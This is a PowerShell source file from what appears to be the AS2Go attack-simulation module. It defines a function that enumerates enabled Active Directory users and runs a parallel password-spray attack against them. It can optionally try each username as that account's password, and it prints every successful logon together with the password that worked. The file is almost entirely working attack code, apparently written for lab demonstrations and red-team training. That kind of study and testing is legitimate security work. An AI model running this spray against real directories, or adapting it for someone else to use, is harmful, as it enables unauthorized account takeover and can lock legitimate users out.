<#
.SYNOPSIS
Tests a supplied password against enabled AD users in a search base.

.DESCRIPTION
Queries enabled users from the specified search base and resolves the target domain through Server.
Uses parallel PrincipalContext credential checks with the supplied password and optional account-name fallback.
Displays progress and successful credential checks; Q can stop the active job while results are collected.
Does not return the collected result list as a structured object.

.PARAMETER SearchBase
Distinguished name of the OU or domain subtree containing users to test.

.PARAMETER Password
Plain-text password tried against each enabled account.

.PARAMETER Server
AD server used to query the domain and users. Credential checks use the resolved domain DNS name.

.PARAMETER IncludeSamAccountNameAsPassword
Also tries the user's SamAccountName as its password when the supplied password fails.

.PARAMETER ThrottleLimit
Maximum concurrent credential checks, from 1 through 100. Defaults to 15.

.EXAMPLE
Start-PasswordSprayAttack -SearchBase "OU=Demo Accounts,OU=AS2Go,DC=example,DC=com" -Server "DC01.example.com" -Password "LabPassword123!"
Tests the supplied lab password against enabled users below the demo-account OU.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Failed credential checks count as authentication attempts and may affect account lockout counters.

.COMPONENT
Category: Sub Function

.FUNCTIONALITY
Tests a supplied password against enabled accounts in the specified AD search base.
Optionally tries each account name as its password and reports successful checks with parallel progress tracking.
#>
function Start-PasswordSprayAttack {

    ################################################################################
    ######                                                                     #####
    ######    Run Password Spray in parallel                                   #####
    ######                                                                     #####
    ################################################################################

    param(
        [Parameter(Mandatory)] 
        [string]$SearchBase,
        [Parameter(Mandatory)]
        [string]$Password,
        [Parameter(Mandatory)]
        [string]$Server,
        [Switch]$IncludeSamAccountNameAsPassword,
        [ValidateRange(1, 100)]
        [int]$ThrottleLimit = 15
    )

    $Info = Measure-FunctionRuntime -Begin

    $adDomain = Get-ADDomain -Server $Server
    $domain = $adDomain.NetBIOSName
    $domainFqdn = $adDomain.DNSRoot

    $users = Get-ADUser `
        -Filter "Enabled -eq 'True'" `
        -SearchBase $SearchBase `
        -Server $Server `
        -Properties SamAccountName

    $total = $users.Count

    if ($total -eq 0) {
        Write-AS2GoOutput -Type Warning -Message "No users found under $SearchBase"
        return
    }
    
    $cname = Convert-FromDNToCN -DistinguishedName $SearchBase
    Write-AS2GoOutput -Type Quit -Message "Press 'Q' at any time to abort Passwort Spray `n      for '$total' users under '$cname'!"

    $startTime = Get-Date
    $expectedUsers = @($users | ForEach-Object { "$domain\$($_.SamAccountName)" })

    $sprayWorker = {
        $user = "$using:domain\$($_.SamAccountName)"
        $isSuccess = $false
        $usedPassword = $using:Password
        $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $contextOptions = [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate

        try {
            try {
                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $using:domainFqdn)
                $isSuccess = $principalContext.ValidateCredentials($_.SamAccountName, $using:Password, $contextOptions)
                $principalContext.Dispose()
            }
            catch {
                $isSuccess = $false
            }

            if ((-not $isSuccess) -and $using:IncludeSamAccountNameAsPassword) {
                if ($using:IncludeSamAccountNameAsPassword) {
                    try {
                        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $using:domainFqdn)
                        $isSuccess = $principalContext.ValidateCredentials($_.SamAccountName, $_.SamAccountName, $contextOptions)
                        $principalContext.Dispose()
                        if ($isSuccess) {
                            $usedPassword = $_.SamAccountName
                        }
                    }
                    catch {
                        $isSuccess = $false
                    }
                }
            }

            [PSCustomObject]@{
                User     = $user
                Password = $usedPassword
                Success  = $isSuccess
            }
        }
        catch {
            [PSCustomObject]@{
                User     = $user
                Password = $usedPassword
                Success  = $false
            }
        }
    }

    $allResults = [System.Collections.Generic.List[object]]::new()
    $processed = 0

    $job = $users | ForEach-Object -Parallel $sprayWorker -ThrottleLimit $ThrottleLimit -AsJob

    while ($job.State -eq "Running") {

        if ([Console]::KeyAvailable) {
            if ([Console]::ReadKey($true).Key -eq 'Q') {
                Stop-Job $job
                break
            }
        }

        $newResults = Receive-Job $job
        if ($null -ne $newResults) {
            foreach ($r in @($newResults)) {
                $allResults.Add($r)
            }
        }

        $processed = $allResults.Count
        $percent = [math]::Round(($processed / $total) * 100, 2)
        $elapsed = (Get-Date) - $startTime
        $rate = if ($elapsed.TotalSeconds -gt 0) { [math]::Round($processed / $elapsed.TotalSeconds, 2) } else { 0 }
        $eta = if ($rate -gt 0) { [math]::Round(($total - $processed) / $rate, 1) } else { 0 }

        Write-Progress `
            -Activity "Performing Password Spray" `
            -Status "Done: $processed/$total | $rate ops/s | ETA: $eta s | Throttle: $ThrottleLimit" `
            -PercentComplete $percent

        Start-Sleep -Milliseconds 250
    }

    $remainingResults = Receive-Job $job
    if ($null -ne $remainingResults) {
        foreach ($r in @($remainingResults)) {
            $allResults.Add($r)
        }
    }
    Remove-Job $job -Force -ErrorAction SilentlyContinue

    # Guarantee one output object per input account.
    $returnedUsers = @($allResults | ForEach-Object { $_.User })
    foreach ($expectedUser in $expectedUsers) {
        if ($expectedUser -notin $returnedUsers) {
            $allResults.Add([PSCustomObject]@{
                    User     = $expectedUser
                    Password = $Password
                    Success  = $false
                })
        }
    }

    Write-Progress -Activity "Performing Password Spray" -Completed

    Write-AS2GoOutput -Type Info -Message "Processed users: $total | Returned results: $($allResults.Count)"

    $success = $allResults | Where-Object { $_.Success -eq $true }

    if ($success) {

        Write-AS2GoOutput -Type TextMaker -Message "Successful Logons under $cname`:" -TM $($success.count)
        $success | ForEach-Object {
            Write-AS2GoOutput -Type Bullet -Message "$($_.User) Pw:" -TM  $_.Password 
        }
    }
    else {
        Write-AS2GoOutput -Type Warning -Message "No successful logons!"
    }

    Write-AS2GoOutput -Type Success -Message "Finished Password Spray for current scope."

    Measure-FunctionRuntime -End -Details $Info
}